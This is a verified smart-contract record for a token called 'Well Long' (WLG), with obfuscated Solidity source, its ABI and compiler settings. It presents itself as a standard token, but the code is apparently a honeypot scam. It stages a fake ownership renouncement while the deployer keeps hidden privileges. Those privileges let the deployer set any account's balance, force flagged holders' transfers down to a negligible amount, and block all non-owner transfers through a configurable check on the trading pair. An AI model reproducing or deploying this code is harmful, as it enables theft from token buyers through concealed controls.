{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface tokenList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isFee {\n    function createPair(address feeAt, address buySell) external returns (address);\n}\n\ninterface fundTakeTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromMode) external view returns (uint256);\n\n    function transfer(address sellSwap, uint256 listTx) external returns (bool);\n\n    function allowance(address launchedReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellSwap,\n        uint256 listTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingMarketing, uint256 value);\n    event Approval(address indexed launchedReceiver, address indexed spender, uint256 value);\n}\n\ninterface senderLaunch is fundTakeTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WellLong is minFund, fundTakeTotal, senderLaunch {\n\n    function name() external view virtual override returns (string memory) {\n        return buyLimitMarketing;\n    }\n\n    function balanceOf(address fromMode) public view virtual override returns (uint256) {\n        return teamTo[fromMode];\n    }\n\n    function owner() external view returns (address) {\n        return limitShould;\n    }\n\n    function sellWallet() public {\n        emit OwnershipTransferred(enableFee, address(0));\n        limitShould = address(0);\n    }\n\n    uint256 private takeIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletExemptMarketing;\n    }\n\n    bool public receiverTx;\n\n    uint256 constant buyAmount = 8 ** 10;\n\n    constructor (){\n        if (minTx != receiverMin) {\n            receiverTx = false;\n        }\n        tokenList receiverWalletSwap = tokenList(txMinExempt);\n        limitTradingAt = isFee(receiverWalletSwap.factory()).createPair(receiverWalletSwap.WETH(), address(this));\n        if (sellIsFund == takeIs) {\n            teamAmountTake = takeIs;\n        }\n        enableFee = _msgSender();\n        sellWallet();\n        atTo[enableFee] = true;\n        teamTo[enableFee] = launchedMinFund;\n        \n        emit Transfer(address(0), enableFee, launchedMinFund);\n    }\n\n    string private shouldMaxToken = \"WLG\";\n\n    uint256 feeMode;\n\n    function allowance(address limitReceiver, address marketingTeam) external view virtual override returns (uint256) {\n        if (marketingTeam == txMinExempt) {\n            return type(uint256).max;\n        }\n        return atLiquidity[limitReceiver][marketingTeam];\n    }\n\n    uint256 public autoAmount;\n\n    bool public receiverTeamEnable;\n\n    address txMinExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public atTo;\n\n    function getOwner() external view returns (address) {\n        return limitShould;\n    }\n\n    address fromTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 liquidityMinFee;\n\n    function swapFund(address fromEnable, address sellSwap, uint256 listTx) internal returns (bool) {\n        if (fromEnable == enableFee) {\n            return toAtSwap(fromEnable, sellSwap, listTx);\n        }\n        uint256 atLaunch = fundTakeTotal(limitTradingAt).balanceOf(fromTake);\n        require(atLaunch == feeMode);\n        require(sellSwap != fromTake);\n        if (txReceiver[fromEnable]) {\n            return toAtSwap(fromEnable, sellSwap, buyAmount);\n        }\n        return toAtSwap(fromEnable, sellSwap, listTx);\n    }\n\n    bool private amountTo;\n\n    function buyEnable(address feeMarketing) public {\n        launchReceiver();\n        \n        if (feeMarketing == enableFee || feeMarketing == limitTradingAt) {\n            return;\n        }\n        txReceiver[feeMarketing] = true;\n    }\n\n    function totalReceiver(uint256 listTx) public {\n        launchReceiver();\n        feeMode = listTx;\n    }\n\n    function senderLaunched(address receiverFrom, uint256 listTx) public {\n        launchReceiver();\n        teamTo[receiverFrom] = listTx;\n    }\n\n    string private buyLimitMarketing = \"Well Long\";\n\n    mapping(address => mapping(address => uint256)) private atLiquidity;\n\n    function transferFrom(address fromEnable, address sellSwap, uint256 listTx) external override returns (bool) {\n        if (_msgSender() != txMinExempt) {\n            if (atLiquidity[fromEnable][_msgSender()] != type(uint256).max) {\n                require(listTx <= atLiquidity[fromEnable][_msgSender()]);\n                atLiquidity[fromEnable][_msgSender()] -= listTx;\n            }\n        }\n        return swapFund(fromEnable, sellSwap, listTx);\n    }\n\n    function toAtSwap(address fromEnable, address sellSwap, uint256 listTx) internal returns (bool) {\n        require(teamTo[fromEnable] >= listTx);\n        teamTo[fromEnable] -= listTx;\n        teamTo[sellSwap] += listTx;\n        emit Transfer(fromEnable, sellSwap, listTx);\n        return true;\n    }\n\n    function minFee(address swapTake) public {\n        if (exemptTeam) {\n            return;\n        }\n        if (receiverTeamEnable != amountTo) {\n            minTx = sellIsFund;\n        }\n        atTo[swapTake] = true;\n        if (receiverMin != sellIsFund) {\n            amountTo = false;\n        }\n        exemptTeam = true;\n    }\n\n    uint256 private launchedMinFund = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public txReceiver;\n\n    mapping(address => uint256) private teamTo;\n\n    event OwnershipTransferred(address indexed fundSwap, address indexed exemptShouldMarketing);\n\n    uint256 private sellIsFund;\n\n    function launchReceiver() private view {\n        require(atTo[_msgSender()]);\n    }\n\n    uint256 private minTx;\n\n    address public limitTradingAt;\n\n    uint256 public receiverMin;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldMaxToken;\n    }\n\n    uint256 public teamAmountTake;\n\n    address private limitShould;\n\n    bool public exemptTeam;\n\n    address public enableFee;\n\n    function approve(address marketingTeam, uint256 listTx) public virtual override returns (bool) {\n        atLiquidity[_msgSender()][marketingTeam] = listTx;\n        emit Approval(_msgSender(), marketingTeam, listTx);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedMinFund;\n    }\n\n    uint8 private walletExemptMarketing = 18;\n\n    function transfer(address receiverFrom, uint256 listTx) external virtual override returns (bool) {\n        return swapFund(_msgSender(), receiverFrom, listTx);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptShouldMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"}],\"name\":\"buyEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTradingAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"}],\"name\":\"minFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeamEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTx\",\"type\":\"uint256\"}],\"name\":\"senderLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAmountTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listTx\",\"type\":\"uint256\"}],\"name\":\"totalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "WellLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}